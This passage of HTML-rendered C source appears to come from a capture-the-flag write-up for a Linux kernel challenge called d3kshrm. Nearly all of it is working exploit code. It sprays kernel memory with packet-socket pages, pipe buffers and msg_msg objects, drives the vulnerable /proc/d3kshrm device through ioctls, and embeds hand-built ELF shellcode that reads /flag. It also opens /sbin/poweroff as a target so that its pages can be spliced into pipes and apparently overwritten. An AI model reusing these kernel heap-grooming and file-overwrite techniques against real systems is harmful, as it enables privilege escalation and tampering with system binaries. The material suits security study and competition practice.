class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                req.cmd</span><br><span class="line">            );</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != PGV_CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_pgv_socket</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = PGV_CMD_ALLOC_SOCKET,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">destroy_pgv_socket</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = PGV_CMD_FREE_SOCKET,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = PGV_CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = PGV_CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Challenge Interface</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_CREATE_D3KSHRM    0x3361626e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_DELETE_D3KSHRM    0x74747261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SELECT_D3KSHRM    0x746e6162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_UNBIND_D3KSHRM    0x33746172</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PAGE_NR 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> chal_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kshrm_create</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> page_nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_CREATE_D3KSHRM, page_nr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kshrm_delete</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_DELETE_D3KSHRM, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kshrm_select</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_SELECT_D3KSHRM, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kshrm_unbind</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, CMD_UNBIND_D3KSHRM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Exploitation procedure</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NR 126</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((err = pipe(pipe_fd[i])) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;[x] failed to alloc &quot;</span>)<span class="string">&quot;%d&quot;</span>ERROR_MSG(<span class="string">&quot; pipe!\n&quot;</span>), i</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">expand_pipe</span><span class="params">(<span class="type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="number">2</span>], <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((err = fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, size)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;[x] failed to expand &quot;</span>)<span class="string">&quot;%d&quot;</span>ERROR_MSG(<span class="string">&quot; pipe!\n&quot;</span>), i</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice_pipe</span><span class="params">(<span class="type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="number">2</span>], <span class="type">int</span> victim_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> err;</span><br><span class="line">    <span class="type">loff_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ((err = splice(victim_fd,&amp;offset,pipe_fd[i][<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">0x1000</span>,<span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;[x] failed to splice &quot;</span>)<span class="string">&quot;%d&quot;</span>ERROR_MSG(<span class="string">&quot; pipe!\n&quot;</span>),i</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PBF_SZ_PAGE_NR (0x1000 / 8)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> shellcode[] = &#123;</span><br><span class="line">    <span class="comment">/* ELF header */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// e_ident[16]</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="comment">/* Magic number &quot;\x7fELF&quot; */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* ELF type: 64-bit */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* ELF encode: LSB */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* ELF version: current */</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,   <span class="comment">/* Reserve */</span></span><br><span class="line">    <span class="comment">// e_type: ET_EXEC</span></span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_machine: AMD x86-64</span></span><br><span class="line">    <span class="number">0x3e</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_version: 1</span></span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_entry: 0x0000000000400078</span></span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_phoff: 0x40</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_shoff: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_flags: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_ehsize: 0x40</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_phentsize: 0x38</span></span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_phnum: 1</span></span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_shentsize: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_shnum: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// e_shstrndx: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Program Header Table[0] */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// p_type: PT_LOAD</span></span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_flags: PF_R | PF_W | PF_X</span></span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_offset: 0</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_vaddr: 0x0000000000400000</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_paddr: 0x0000000000400000</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_filesz: 0xD5</span></span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_memsz: 0xF2</span></span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// p_align: 0x1000</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Sections[0]: Shellcode */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// opening &quot;/flag&quot; and read</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// xor rax, rax</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="comment">// push rax</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// movabs rax, 0x67616c662f # &quot;/flag&quot;</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// push rax</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// mov rax, 0x02</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// mov rdi, rsp</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">    <span class="comment">// xor rsi, rsi</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>,</span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="comment">// mov rdi, rax</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>,</span><br><span class="line">    <span class="comment">// xor rax, rax</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="comment">// sub, rsp, 0x100</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xec</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// mov rsi, rsp</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>,</span><br><span class="line">    <span class="comment">// mov rdi, 0x100</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="comment">// mox rax, 0x1</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// mox rdi, 0x1</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc7</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// mox rsi, rsp</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>,</span><br><span class="line">    <span class="comment">// mox rdx, 0x100</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="comment">// xor rdi, rdi</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>,</span><br><span class="line">    <span class="comment">// mov rax, 0x3c</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE8_SPRAY_NR 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> errno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE8_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((errno = create_pgv_socket(i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Failed to allocate socket: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> errno;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((errno = alloc_page(i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Failed to alloc pages on socket: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> errno;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NR 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_SPRAY_NR 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prepare_msg_queue</span><span class="params">(<span class="type">int</span> msqid[MSG_QUEUE_NR])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;[x] Unable to create &quot;</span>)<span class="string">&quot;%d&quot;</span>ERROR_MSG(<span class="string">&quot; msg_queue\n&quot;</span>),</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">return</span> msqid[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spray_msg_msg</span><span class="params">(<span class="type">int</span> msqid[MSG_QUEUE_NR])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((err = write_msg(msqid[i],buf,<span class="number">0xF00</span>,<span class="number">0x3361626e74747261</span>+i)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KSHRM_SLUB_OBJ_NR 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KSHRM_SPRAY_NR (D3KSHRM_SLUB_OBJ_NR * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pipe_fd1[PIPE_SPRAY_NR][<span class="number">2</span>], pipe_fd2[PIPE_SPRAY_NR][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> msqid[MSG_QUEUE_NR];</span><br><span class="line">    <span class="type">int</span> d3kshrm_fd[D3KSHRM_SPRAY_NR], d3kshrm_idx[D3KSHRM_SPRAY_NR];</span><br><span class="line">    <span class="type">int</span> victim_fd;</span><br><span class="line">    <span class="type">char</span> *oob_buf[D3KSHRM_SPRAY_NR];</span><br><span class="line">    <span class="type">void</span> *victim_buf;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    prepare_pgv_system();</span><br><span class="line"></span><br><span class="line">    victim_fd = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (victim_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open target victim file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Allocating msg_queue for clearing kmem_cache...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prepare_msg_queue(msqid) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Allocating pipe_fd1 group...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prepare_pipe(pipe_fd1) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to spray pipe_buffer&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to prepare first part of pipes.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Allocating pipe_fd2 group...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prepare_pipe(pipe_fd2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to spray pipe_buffer&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to prepare second part of pipes.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing D3KSHRM files...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((d3kshrm_fd[i] = open(<span class="string">&quot;/proc/d3kshrm&quot;</span>, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(ERROR_MSG(<span class="string">&quot;Failed to open /proc/d3kshrm&quot;</span>));</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray D3KSHRM files.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Pre-allocating ONE SLUB pages for D3kSHRM...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((d3kshrm_idx[<span class="number">0</span>] = d3kshrm_create(d3kshrm_fd[<span class="number">0</span>], PBF_SZ_PAGE_NR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to create D3KSHRM shared memory&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to spray D3KSHRM shared memory.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Allocating pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prepare_pgv_pages() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to prepare pages on packet socket.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Clear previous redundant memory storage in kernel...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_msg_msg(msqid) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to spray msg_msg&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to clear reduncant kernel memory storage.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Spraying D3KSHRM buffer...&quot;</span>);</span><br><span class="line"></span><br><span 